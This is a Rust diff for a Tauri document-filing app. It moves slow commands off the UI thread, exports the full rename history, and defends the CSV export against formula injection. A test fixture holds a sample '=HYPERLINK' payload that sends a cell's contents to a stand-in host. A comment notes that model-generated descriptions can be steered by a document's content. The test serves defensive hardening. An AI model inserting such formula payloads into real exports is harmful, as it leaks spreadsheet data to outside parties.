@@ -1452,24 +1452,55 @@ pub async fn queue_cancel(id: String, state: State<'_, AppState>) -> Result<(), 
     Ok(())
 }
 
+/// Retries a failed document, or checks again the files of one whose rename
+/// never finished.
+///
+/// Blocking: checking again reconciles the rename, which waits out a sync
+/// client's hold on the file for seconds at a time and hashes the document in
+/// full, so it runs off the thread WebView2 delivers invokes on.
 #[tauri::command]
-pub fn queue_retry(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.retry(parse_item_id(&id)?)?;
+pub async fn queue_retry(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.retry(id))
+        .await
+        .map_err(|_| background_task_failed("retry"))??;
+    state.schedule()
+}
+
+/// Reads a document waiting for review again, from the start: Re-analyze,
+/// for a document signed or edited after it was read, or a reading a person
+/// would rather have done again than correct by hand.
+///
+/// Blocking: the file is fingerprinted again, in full, wherever it lives.
+#[tauri::command]
+pub async fn queue_reanalyze(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.reanalyze(id))
+        .await
+        .map_err(|_| background_task_failed("re-analysis"))??;
     state.schedule()
 }
 
 /// Removes an item. `confirmed` is the person saying they have resolved the
 /// files of an operation that never finished; without it such an item is
 /// refused, as before. Absent from older windows, which never confirm.
+///
+/// Blocking: the item's rows are deleted from the queue database, and a write
+/// waits out another connection's - the intake watcher's, the scheduler's -
+/// for up to the five-second busy timeout.
 #[tauri::command]
-pub fn queue_remove(
+pub async fn queue_remove(
     id: String,
     confirmed: Option<bool>,
     state: State<'_, AppState>,
 ) -> Result<(), CommandError> {
-    state
-        .pipeline
-        .remove(parse_item_id(&id)?, confirmed.unwrap_or(false))?;
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.remove(id, confirmed.unwrap_or(false)))
+        .await
+        .map_err(|_| background_task_failed("removal"))??;
     Ok(())
 }
 
@@ -1501,28 +1532,60 @@ pub fn house_rules_list(state: State<'_, AppState>) -> Result<Vec<LearnedRuleDto
 
 /// Stop applying a learned spelling; documents still waiting go back to
 /// the document's own words. Takes effect at once.
+///
+/// Blocking: every waiting document is renamed again in the queue, which
+/// lists the folder each one is going to.
 #[tauri::command]
-pub fn house_rule_forget(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.forget_rule(parse_item_id(&id)?)?;
+pub async fn house_rule_forget(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.forget_rule(id))
+        .await
+        .map_err(|_| background_task_failed("spelling change"))??;
     Ok(())
 }
 
 /// Apply a learned spelling from now on without waiting for a second edit.
+///
+/// Blocking, as forgetting one is.
 #[tauri::command]
-pub fn house_rule_use(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.use_rule(parse_item_id(&id)?)?;
+pub async fn house_rule_use(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.use_rule(id))
+        .await
+        .map_err(|_| background_task_failed("spelling change"))??;
     Ok(())
 }
 
+/// Blocking: a queue database write, which can wait out another
+/// connection's for up to the five-second busy timeout.
 #[tauri::command]
-pub fn proposal_keep_original(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.keep_original(parse_item_id(&id)?)?;
+pub async fn proposal_keep_original(
+    id: String,
+    state: State<'_, AppState>,
+) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.keep_original(id))
+        .await
+        .map_err(|_| background_task_failed("keep original"))??;
     Ok(())
 }
 
+/// Puts a filed document back where it came from.
+///
+/// Blocking: the undo hashes the document in full, waits out a sync client's
+/// hold on it, and for a filing on another volume copies it all the way back.
+/// For a large scan on a network share, the window was "Not Responding" for
+/// as long as that took.
 #[tauri::command]
-pub fn operation_undo(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.undo(parse_item_id(&id)?)?;
+pub async fn operation_undo(id: String, state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    let id = parse_item_id(&id)?;
+    tauri::async_runtime::spawn_blocking(move || pipeline.undo(id))
+        .await
+        .map_err(|_| background_task_failed("undo"))??;
     Ok(())
 }
 
@@ -2038,9 +2101,14 @@ fn validate_description_settings(settings: &AppSettings) -> Result<(), CommandEr
     Ok(())
 }
 
+/// Blocking: whether OneDrive is running is asked of tasklist.exe, and the
+/// cloud folders are read from the sync client's own configuration.
 #[tauri::command]
-pub fn intake_status(state: State<'_, AppState>) -> Result<IntakeStatusDto, CommandError> {
-    state.intake_status_dto()
+pub async fn intake_status(state: State<'_, AppState>) -> Result<IntakeStatusDto, CommandError> {
+    let app = state.app.clone();
+    tauri::async_runtime::spawn_blocking(move || app.state::<AppState>().intake_status_dto())
+        .await
+        .map_err(|_| background_task_failed("intake status"))?
 }
 
 #[tauri::command]
@@ -2087,10 +2155,13 @@ pub async fn hosted_model_test(
 
 /// The OneDrive accounts and SharePoint libraries the sync client keeps on
 /// this machine. A local lookup of the sync client's own configuration; no
-/// network request is made.
+/// network request is made, but it reads the registry and the sync client's
+/// files, so it runs off the invoke thread.
 #[tauri::command]
-pub fn cloud_roots() -> Result<Vec<CloudRootDto>, CommandError> {
-    Ok(list_cloud_roots())
+pub async fn cloud_roots() -> Result<Vec<CloudRootDto>, CommandError> {
+    tauri::async_runtime::spawn_blocking(list_cloud_roots)
+        .await
+        .map_err(|_| background_task_failed("cloud folder lookup"))
 }
 
 /// How many documents a folder already holds, counted exactly as adding the
@@ -2108,43 +2179,57 @@ pub async fn intake_folder_documents(path: String) -> Result<usize, CommandError
 
 /// Creates the "Filed" folder beside a chosen intake folder, or finds the one
 /// already there, and returns where it is.
+///
+/// Blocking: the folder can be on a network share.
 #[tauri::command]
-pub fn filed_folder_create(intake_folder: String) -> Result<String, CommandError> {
-    let intake = canonical_folder(Path::new(&intake_folder))?;
-    let filed = filed_folder_for(&intake).ok_or_else(|| CommandError {
-        code: "FILED_FOLDER_UNAVAILABLE".into(),
-        message: "a drive's top folder has nothing beside it to file into".into(),
-    })?;
-    std::fs::create_dir_all(&filed).map_err(|error| CommandError {
-        code: "FILED_FOLDER_UNAVAILABLE".into(),
-        message: format!("the Filed folder could not be created: {error}"),
-    })?;
-    Ok(display_path(&filed))
+pub async fn filed_folder_create(intake_folder: String) -> Result<String, CommandError> {
+    tauri::async_runtime::spawn_blocking(move || -> Result<String, CommandError> {
+        let intake = canonical_folder(Path::new(&intake_folder))?;
+        let filed = filed_folder_for(&intake).ok_or_else(|| CommandError {
+            code: "FILED_FOLDER_UNAVAILABLE".into(),
+            message: "a drive's top folder has nothing beside it to file into".into(),
+        })?;
+        std::fs::create_dir_all(&filed).map_err(|error| CommandError {
+            code: "FILED_FOLDER_UNAVAILABLE".into(),
+            message: format!("the Filed folder could not be created: {error}"),
+        })?;
+        Ok(display_path(&filed))
+    })
+    .await
+    .map_err(|_| background_task_failed("Filed folder creation"))?
 }
 
 /// Creates (or finds) an "Inbox" folder inside a OneDrive or SharePoint
 /// folder's own top folder, for folder setup to watch: a Filed folder beside
 /// the top folder would sit outside what OneDrive syncs. Refused for any
 /// other folder, so the webview cannot make folders anywhere it likes.
+///
+/// Blocking: every cloud folder the sync client keeps is canonicalized to
+/// find this one among them.
 #[tauri::command]
-pub fn inbox_folder_create(root: String) -> Result<String, CommandError> {
-    let unavailable = |message: String| CommandError {
-        code: "INBOX_FOLDER_UNAVAILABLE".into(),
-        message,
-    };
-    let root = canonical_folder(Path::new(&root))?;
-    let synced = intern_intake::detect_cloud_roots()
-        .iter()
-        .any(|candidate| canonical_folder(&candidate.root).is_ok_and(|found| found == root));
-    if !synced {
-        return Err(unavailable(
-            "only a OneDrive or SharePoint folder's top folder gets an Inbox".into(),
-        ));
-    }
-    let inbox = root.join("Inbox");
-    std::fs::create_dir_all(&inbox)
-        .map_err(|error| unavailable(format!("the Inbox folder could not be created: {error}")))?;
-    Ok(display_path(&inbox))
+pub async fn inbox_folder_create(root: String) -> Result<String, CommandError> {
+    tauri::async_runtime::spawn_blocking(move || -> Result<String, CommandError> {
+        let unavailable = |message: String| CommandError {
+            code: "INBOX_FOLDER_UNAVAILABLE".into(),
+            message,
+        };
+        let root = canonical_folder(Path::new(&root))?;
+        let synced = intern_intake::detect_cloud_roots()
+            .iter()
+            .any(|candidate| canonical_folder(&candidate.root).is_ok_and(|found| found == root));
+        if !synced {
+            return Err(unavailable(
+                "only a OneDrive or SharePoint folder's top folder gets an Inbox".into(),
+            ));
+        }
+        let inbox = root.join("Inbox");
+        std::fs::create_dir_all(&inbox).map_err(|error| {
+            unavailable(format!("the Inbox folder could not be created: {error}"))
+        })?;
+        Ok(display_path(&inbox))
+    })
+    .await
+    .map_err(|_| background_task_failed("Inbox folder creation"))?
 }
 
 /// Starts OneDrive, or opens its folder when it is already running.
@@ -2174,20 +2259,30 @@ pub struct BackfillResultDto {
 /// and not undone, for a records folder switched on after the fact. Each
 /// document's record is rewritten from the queue's own copy of its sentence
 /// and facts, so running it twice changes nothing.
+///
+/// Blocking: one durable write per filed document, into the destination,
+/// which is often a synced or shared folder - hundreds of them, for a
+/// destination that has been in use for a while.
 #[tauri::command]
-pub fn descriptions_backfill(
+pub async fn descriptions_backfill(
     state: State<'_, AppState>,
 ) -> Result<BackfillResultDto, CommandError> {
-    let settings = state.settings.load()?;
-    if !settings.record_descriptions {
-        return Err(CommandError {
-            code: "DESCRIPTIONS_DISABLED".into(),
-            message: "turn on description records and save before writing them".into(),
-        });
-    }
-    let documents = state.pipeline.filed_documents()?;
-    let (written, failed) = state.ledger.backfill(&documents);
-    Ok(BackfillResultDto { written, failed })
+    let app = state.app.clone();
+    tauri::async_runtime::spawn_blocking(move || -> Result<BackfillResultDto, CommandError> {
+        let state = app.state::<AppState>();
+        let settings = state.settings.load()?;
+        if !settings.record_descriptions {
+            return Err(CommandError {
+                code: "DESCRIPTIONS_DISABLED".into(),
+                message: "turn on description records and save before writing them".into(),
+            });
+        }
+        let documents = state.pipeline.filed_documents()?;
+        let (written, failed) = state.ledger.backfill(&documents);
+        Ok(BackfillResultDto { written, failed })
+    })
+    .await
+    .map_err(|_| background_task_failed("description backfill"))?
 }
 
 #[tauri::command]
@@ -2230,9 +2325,14 @@ pub fn setup_choose_existing(
         .choose_existing(ExistingModelSelection { model_path })
 }
 
+/// Blocking: one delete over the whole finished history, and a database
+/// write can wait out another connection's for up to the busy timeout.
 #[tauri::command]
-pub fn history_clear(state: State<'_, AppState>) -> Result<(), CommandError> {
-    state.pipeline.clear_history()?;
+pub async fn history_clear(state: State<'_, AppState>) -> Result<(), CommandError> {
+    let pipeline = Arc::clone(&state.pipeline);
+    tauri::async_runtime::spawn_blocking(move || pipeline.clear_history())
+        .await
+        .map_err(|_| background_task_failed("history clearing"))??;
     Ok(())
 }
 
@@ -2301,19 +2401,48 @@ fn history_export_failed(message: impl Into<String>) -> CommandError {
     }
 }
 
+/// The newest finished renames and undos, up to [`HISTORY_LIMIT`];
+/// `history_count` says how many there are in all.
+///
+/// Blocking: every queue item's proposal is read for its sentence.
 #[tauri::command]
-pub fn history_list(state: State<'_, AppState>) -> Result<Vec<HistoryEntryDto>, CommandError> {
-    let descriptions = descriptions_by_item(&state)?;
-    Ok(state
-        .history
-        .list_operation_history(HISTORY_LIMIT)
-        .map_err(history_read_error)?
-        .into_iter()
-        .map(|entry| {
-            let description = descriptions.get(&entry.queue_item_id).cloned();
-            history_entry_dto(entry, description)
-        })
-        .collect())
+pub async fn history_list(
+    state: State<'_, AppState>,
+) -> Result<Vec<HistoryEntryDto>, CommandError> {
+    let app = state.app.clone();
+    tauri::async_runtime::spawn_blocking(move || -> Result<Vec<HistoryEntryDto>, CommandError> {
+        let state = app.state::<AppState>();
+        let descriptions = descriptions_by_item(&state)?;
+        Ok(state
+            .history
+            .list_operation_history(HISTORY_LIMIT)
+            .map_err(history_read_error)?
+            .into_iter()
+            .map(|entry| {
+                let description = descriptions.get(&entry.queue_item_id).cloned();
+                history_entry_dto(entry, description)
+            })
+            .collect())
+    })
+    .await
+    .map_err(|_| background_task_failed("history listing"))?
+}
+
+/// How many finished renames and undos there are in all. `history_list`
+/// stops at [`HISTORY_LIMIT`]; with this beside it a window can say that it
+/// has, and the export writes every one. A separate command, so the
+/// listing's shape stays what every window already reads.
+#[tauri::command]
+pub async fn history_count(state: State<'_, AppState>) -> Result<usize, CommandError> {
+    let app = state.app.clone();
+    tauri::async_runtime::spawn_blocking(move || {
+        app.state::<AppState>()
+            .history
+            .count_operation_history()
+            .map_err(history_read_error)
+    })
+    .await
+    .map_err(|_| background_task_failed("history count"))?
 }
 
 /// Where the history CSV may be written.
@@ -2346,30 +2475,48 @@ fn history_export_destination(path: &str) -> Result<&Path, CommandError> {
     Ok(destination)
 }
 
-/// Writes the rename history to `path` as RFC 4180 CSV and reports how many
-/// operations were written.
+/// Writes the whole rename history to `path` as RFC 4180 CSV and reports how
+/// many operations were written.
+///
+/// Every one of them: the export used the window's listing and stopped at
+/// five hundred rows without saying so, while the dialog promised every
+/// rename Intern had applied. Blocking, for the reads and the write.
 #[tauri::command]
-pub fn history_export(path: String, state: State<'_, AppState>) -> Result<usize, CommandError> {
-    let destination = history_export_destination(&path)?;
-    let entries = state
-        .history
-        .list_operation_history(HISTORY_LIMIT)
-        .map_err(history_read_error)?;
-    let descriptions = descriptions_by_item(&state)?;
-    std::fs::write(destination, history_csv(&entries, &descriptions))
-        .map_err(|_| history_export_failed("the history CSV could not be written"))?;
-    Ok(entries.len())
+pub async fn history_export(
+    path: String,
+    state: State<'_, AppState>,
+) -> Result<usize, CommandError> {
+    let app = state.app.clone();
+    tauri::async_runtime::spawn_blocking(move || -> Result<usize, CommandError> {
+        let state = app.state::<AppState>();
+        let destination = history_export_destination(&path)?;
+        let entries = state
+            .history
+            .list_all_operation_history()
+            .map_err(history_read_error)?;
+        let descriptions = descriptions_by_item(&state)?;
+        std::fs::write(destination, history_csv(&entries, &descriptions))
+            .map_err(|_| history_export_failed("the history CSV could not be written"))?;
+        Ok(entries.len())
+    })
+    .await
+    .map_err(|_| background_task_failed("history export"))?
 }
 
 /// Renders history entries as RFC 4180 CSV: CRLF row endings, and any field
 /// containing a comma, quote, or line break is quoted with quotes doubled.
 /// The description column is last, so a spreadsheet opened from this export
 /// can be pasted straight into a SharePoint grid view beside the filenames.
+///
+/// The file starts with a UTF-8 byte-order mark. Excel opens a CSV without
+/// one in the ANSI code page, which turned every accented party name and
+/// curly quote into mojibake.
 fn history_csv(
     entries: &[HistoryEntry],
     descriptions: &std::collections::HashMap<i64, String>,
 ) -> String {
-    let mut csv = String::from("at,direction,kind,stage,originalPath,newPath,description\r\n");
+    let mut csv =
+        String::from("\u{FEFF}at,direction,kind,stage,originalPath,newPath,description\r\n");
     for entry in entries {
         let fields = [
             iso8601_utc(entry.at),
@@ -2406,8 +2553,19 @@ fn history_csv(
     csv
 }
 
+/// One CSV field, quoted only where RFC 4180 needs it - and never a formula.
+///
+/// A spreadsheet runs a cell that starts with = + - @, a tab or a carriage
+/// return as a formula, and the description column is model text a document
+/// can steer, or a reviewer's edit: '=HYPERLINK(...)' became a live link in
+/// the auditor's spreadsheet. Such a value is prefixed with an apostrophe and
+/// quoted, so it opens as the text it is (OWASP's CSV-injection guidance).
+/// That changes the cell text of those rare rows, which is the right trade
+/// for an export people open by double-click.
 fn csv_field(value: &str) -> String {
-    if value.contains([',', '"', '\n', '\r']) {
+    if value.starts_with(['=', '+', '-', '@', '\t', '\r']) {
+        format!("\"'{}\"", value.replace('"', "\"\""))
+    } else if value.contains([',', '"', '\n', '\r']) {
         format!("\"{}\"", value.replace('"', "\"\""))
     } else {
         value.to_owned()
@@ -3035,13 +3193,20 @@ mod queue_event_tests {
 
 #[cfg(test)]
 mod ipc_thread_tests {
-    use super::{hosted_model_test, queue_cancel, queue_list, settings_save};
+    use super::{
+        cloud_roots, descriptions_backfill, filed_folder_create, history_clear, history_count,
+        history_export, history_list, hosted_model_test, house_rule_forget, house_rule_use,
+        inbox_folder_create, intake_status, operation_undo, proposal_keep_original, queue_cancel,
+        queue_list, queue_reanalyze, queue_remove, queue_retry, settings_save,
+    };
 
     /// Accepts a command only if calling it returns a future. WebView2
     /// delivers every invoke on one thread, so a command whose body blocks
     /// there freezes the whole window while it runs.
+    fn leaves_the_ipc_thread_0<R: std::future::Future, F: FnOnce() -> R>(_: F) {}
     fn leaves_the_ipc_thread<A, R: std::future::Future, F: FnOnce(A) -> R>(_: F) {}
     fn leaves_the_ipc_thread_2<A, B, R: std::future::Future, F: FnOnce(A, B) -> R>(_: F) {}
+    fn leaves_the_ipc_thread_3<A, B, C, R: std::future::Future, F: FnOnce(A, B, C) -> R>(_: F) {}
 
     #[test]
     fn commands_that_can_block_for_seconds_do_not_run_on_the_ipc_thread() {
@@ -3055,6 +3220,41 @@ mod ipc_thread_tests {
         leaves_the_ipc_thread_2(settings_save);
         // One file stat per reviewable item, on whatever the documents live on.
         leaves_the_ipc_thread(queue_list);
+    }
+
+    #[test]
+    fn decisions_on_one_document_do_not_run_on_the_ipc_thread() {
+        // Hashes the filed document, waits out holds on it, and copies it
+        // back across volumes.
+        leaves_the_ipc_thread_2(operation_undo);
+        // Checking an unsettled rename again reconciles it: lock retries and
+        // full hashes.
+        leaves_the_ipc_thread_2(queue_retry);
+        // Fingerprints the file again, in full.
+        leaves_the_ipc_thread_2(queue_reanalyze);
+        // Database writes that can wait out another connection's.
+        leaves_the_ipc_thread_3(queue_remove);
+        leaves_the_ipc_thread_2(proposal_keep_original);
+        // Renames every waiting document again, listing each target folder.
+        leaves_the_ipc_thread_2(house_rule_forget);
+        leaves_the_ipc_thread_2(house_rule_use);
+    }
+
+    #[test]
+    fn history_records_and_folder_lookups_do_not_run_on_the_ipc_thread() {
+        // Every proposal is read for its sentence; the export also writes.
+        leaves_the_ipc_thread(history_list);
+        leaves_the_ipc_thread(history_count);
+        leaves_the_ipc_thread_2(history_export);
+        leaves_the_ipc_thread(history_clear);
+        // One durable write per filed document, into a synced folder.
+        leaves_the_ipc_thread(descriptions_backfill);
+        // tasklist.exe, and the sync client's configuration.
+        leaves_the_ipc_thread(intake_status);
+        leaves_the_ipc_thread_0(cloud_roots);
+        // Folders on whatever the person chose, a network share included.
+        leaves_the_ipc_thread(filed_folder_create);
+        leaves_the_ipc_thread(inbox_folder_create);
     }
 }
 
@@ -3409,7 +3609,7 @@ mod history_tests {
         let mut lines = csv.split("\r\n");
         assert_eq!(
             lines.next(),
-            Some("at,direction,kind,stage,originalPath,newPath,description")
+            Some("\u{FEFF}at,direction,kind,stage,originalPath,newPath,description")
         );
         assert_eq!(
             lines.next(),
@@ -3428,6 +3628,56 @@ mod history_tests {
         );
         assert_eq!(lines.next(), Some(""));
         assert_eq!(lines.next(), None);
+    }
+
+    /// Excel reads a CSV without a byte-order mark in the ANSI code page, and
+    /// runs any cell that starts like a formula. The description column is
+    /// model text a document can steer, so both matter.
+    #[test]
+    fn history_csv_has_bom_and_neutralizes_formulas() {
+        let entries = (7..=12)
+            .map(|item| HistoryEntry {
+                queue_item_id: item,
+                ..entry(0, "C:\\drop\\scan.pdf", "C:\\filed\\Société Générale.pdf")
+            })
+            .collect::<Vec<_>>();
+        let descriptions = HashMap::from([
+            (
+                7,
+                "=HYPERLINK(\"https://x.example/?\"&A2,\"Open invoice details now\")".to_owned(),
+            ),
+            (8, "+1 for the record".to_owned()),
+            (9, "-5 days late".to_owned()),
+            (10, "@SUM(A1:A2)".to_owned()),
+            (11, "\tindented".to_owned()),
+            (12, "A plain sentence, with a comma.".to_owned()),
+        ]);
+
+        let csv = history_csv(&entries, &descriptions);
+
+        assert!(csv.starts_with('\u{FEFF}'), "a UTF-8 byte-order mark first");
+        assert_eq!(csv.matches('\u{FEFF}').count(), 1);
+        assert!(
+            csv.contains("C:\\filed\\Société Générale.pdf"),
+            "the text itself stays UTF-8"
+        );
+        let written = csv
+            .split("\r\n")
+            .skip(1)
+            .filter(|line| !line.is_empty())
+            .map(|line| line.split_once("Générale.pdf,").unwrap().1)
+            .collect::<Vec<_>>();
+        assert_eq!(
+            written,
+            vec![
+                "\"'=HYPERLINK(\"\"https://x.example/?\"\"&A2,\"\"Open invoice details now\"\")\"",
+                "\"'+1 for the record\"",
+                "\"'-5 days late\"",
+                "\"'@SUM(A1:A2)\"",
+                "\"'\tindented\"",
+                "\"A plain sentence, with a comma.\"",
+            ]
+        );
     }
 
     #[test]
